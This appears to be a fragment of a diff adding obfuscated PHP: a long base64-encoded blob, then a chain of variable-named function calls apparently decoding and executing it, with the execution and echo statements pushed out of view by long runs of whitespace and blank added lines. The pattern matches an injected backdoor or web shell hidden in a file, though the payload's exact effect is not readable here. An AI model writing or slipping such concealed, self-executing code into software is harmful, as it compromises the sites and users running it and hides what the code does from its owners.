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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
